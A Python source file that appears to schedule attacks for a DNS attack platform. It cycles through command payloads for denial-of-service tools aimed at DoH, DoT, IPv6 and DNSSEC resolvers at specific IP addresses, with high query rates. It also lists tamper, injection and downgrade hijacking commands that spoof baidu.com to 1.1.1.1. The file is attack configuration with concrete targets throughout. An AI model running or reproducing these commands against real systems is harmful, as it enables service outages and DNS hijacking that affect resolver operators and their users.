import random

ddos_policy_dic = [
    # doh python start_reset_att.py
    {"id": "7", "payload": "-n 1", "pname": "doh"},
    {"id": "7", "payload": "-n 3", "pname": "doh"},
    # {"id": "7", "payload": "-n 4", "pname": "doh"},

    # dot python3 start_pending.py 
    {"id": "10", "payload": "-n 2 -wait 50 -round 1", "pname": "dot"},
    {"id": "10", "payload": "-n 2 -wait 100 -round 5", "pname": "dot"},
    # {"id": "10", "payload": "-n 2 -wait 300 -round 5", "pname": "dot"},

    # ipv6 ./prober 
    {"id": "5", "payload": "comm.e64.fun. 5000 47.76.237.22", "pname": "ipv6"},
    {"id": "5", "payload": "comm.e64.fun. 10000 47.76.237.22 47.242.54.229", "pname": "ipv6"},
    {"id": "5", "payload": "comm.e64.fun. 15000 47.76.237.22 47.242.54.229 8.210.135.224", "pname": "ipv6"},

    # dnssec ./dtool 
    {"id": "3", "payload": "query 47.76.239.205 -p 53 -R -d tree.ncache.site -r 50 -n 5000", "pname": "dnssec"},
    {"id": "3", "payload": "query 47.76.239.205 -p 53 -R -d alias.ncache.site -r 50 -n 5000", "pname": "dnssec"},
    {"id": "3", "payload": "query 47.76.239.205 -p 53 -R -d tree.ncache.site -r 200 -n 20000", "pname": "dnssec"},
    {"id": "3", "payload": "query 47.76.239.205 -p 53 -R -d alias.ncache.site -r 200 -n 20000", "pname": "dnssec"},
    {"id": "3", "payload": "query 47.76.239.205 -p 53 -R -d tree.ncache.site -r 300 -n 30000", "pname": "dnssec"},
    {"id": "3", "payload": "query 47.76.239.205 -p 53 -R -d alias.ncache.site -r 300 -n 30000", "pname": "dnssec"},
]

sjqp_policy_dic = [
    # sjqp dnssec python proxy.py
    {"id": "4", "payload": "", "pname": "dnssec"},

    # sjqp ipv6 ./attack.sh 
    {"id": "6", "payload": "240b:4001:150:a600:5b9:609e:d0ae:e1a 1.1.1.1 eth0 baidu.com 240b:4001:150:a600:5b9:609e:d0ae:e1b", "pname": "ipv6"},
    # {"id": "6", "payload": "240b:4001:150:a600:5b9:609e:d0ae:e1a 2000::1 eth0 victim.duktig.xyz 240b:4001:150:a600:5b9:609e:d0ae:e1b", "pname": "ipv6"},
    # {"id": "6", "payload": "240b:4001:150:a600:5b9:609e:d0ae:e1a 2000::2 eth0 baidu.com 240b:4001:150:a600:5b9:609e:d0ae:e1b", "pname": "ipv6"},
    
    # sjqp doh python downgrade_phase1.py 
    {"id": "8", "payload": "-tamper baidu.com -a 1.1.1.1 && python degrade_phase2.py -p doh", "pname": "doh"},
    {"id": "9", "payload": "-inject baidu.com -a 1.1.1.1 && python degrade_phase2.py -p doh", "pname": "doh"},
    
    # sjqp dot python downgrade_phase1.py 
    {"id": "11", "payload": "-tamper baidu.com -a 1.1.1.1 && python degrade_phase2.py -p dot", "pname": "dot"},
    {"id": "12", "payload": "-inject baidu.com -a 1.1.1.1 && python degrade_phase2.py -p dot", "pname": "dot"},
]

def get_single_policy(policy_type, pname):
    if policy_type == "ddos":
        policy_list = ddos_policy_dic
    elif policy_type == "sjqp":
        policy_list = sjqp_policy_dic
    dot_item = next((item for item in policy_list if item["pname"] == pname), None)
    return dot_item

# 用于保存每个用户的索引，结构为 {task_id: {"ddos": index, "sjqp": index}}
index = {}

# 初始化线程池

def get_policy(policy_type, task_id):
    # 初始化用户的索引为 {"ddos": 0, "sjqp": 0}，如果尚未存在
    index.setdefault(task_id, {"ddos": 0, "sjqp": 0})
    
    # 根据 policy_type 确定对应的策略列表和索引键
    if policy_type == "ddos":
        policy_list = ddos_policy_dic
        key = "ddos"
    elif policy_type == "sjqp":
        policy_list = sjqp_policy_dic
        key = "sjqp"
    elif policy_type == "auto":
        # 随机选择 "ddos" 或 "sjqp"
        key = random.choice(["ddos", "sjqp"])
        policy_list = ddos_policy_dic if key == "ddos" else sjqp_policy_dic

    # 获取当前索引并返回相应命令
    current_index = index[task_id][key]
    command = policy_list[current_index]
    
    # 更新索引位置
    index[task_id][key] = (current_index + 1) % len(policy_list)

    return command

if __name__ == '__main__':
    print(get_single_policy("sjqp", "doh"))

   